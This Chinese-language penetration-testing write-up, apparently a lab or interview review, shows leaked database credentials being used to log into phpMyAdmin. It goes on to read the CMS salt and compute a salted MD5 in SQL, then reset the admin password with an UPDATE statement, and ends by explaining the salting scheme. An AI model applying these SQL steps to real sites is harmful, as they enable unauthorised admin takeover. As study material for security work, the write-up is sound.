# 03 后台登录与密码算法

## 利用数据库凭证登录 phpMyAdmin

通过源码泄露获取到数据库账号密码后，访问 `http://x.x.x.x:800/phpMyAdmin/`，使用 `root` / `root***` 成功登录。

## 查找系统盐值（auth_code）

该系统后台密码采用加盐 MD5 算法，盐值（auth_code）存放在数据库的配置表中。

在 phpMyAdmin 中执行 SQL：

```sql
SELECT name, value FROM ey_config WHERE name LIKE '%auth_code%';
```

结果：
```text
name              | value
system_auth_code  | xxxxxxxx
```

## 计算新密码的哈希

假设我们要将密码改为 `123456`，需要模拟系统的加密算法（先拼接盐值，再计算 MD5）：

```sql
SELECT MD5(CONCAT((SELECT value FROM ey_config WHERE name='system_auth_code'), '123456'));
```

结果（已脱敏）：
```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## 修改管理员密码

```sql
UPDATE ey_admin SET password = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' WHERE admin_id = 1;
```

## 登录后台

访问 `http://x.x.x.x:800/admin_login.php`，用户名 `admin`，密码 `123456`，成功进入后台。

## 面试复盘 / 密码算法详解

**核心逻辑：加盐的本质是先拼后 MD5**

- **错误理解**：先对密码进行 MD5，再拼接盐值或再加密。
- **正确理解**：先将盐值和密码拼接在一起，然后对整体计算 MD5，即 `md5(salt + password)`。
- **系统中的算法实现**：源码 `application/function.php` 中的 `func_encrypt` 函数：
  ```php
  function func_encrypt($str) {
      $auth_code = tpCache('system.system_auth_code');
      return md5($auth_code . $str);
  }
  ```

**为什么要加盐？**
如果不加盐，直接 `md5('123456')` 在任何彩虹表里一查就能反推出明文。加盐后，同样的密码在不同系统里产生的哈希完全不同，彩虹表失效。

**为什么盐值存在数据库而不是写死在源码里？**
实现“双重保障”：攻击者必须同时拿到源码（知道算法）和数据库（知道盐值），才能推算出正确的哈希。
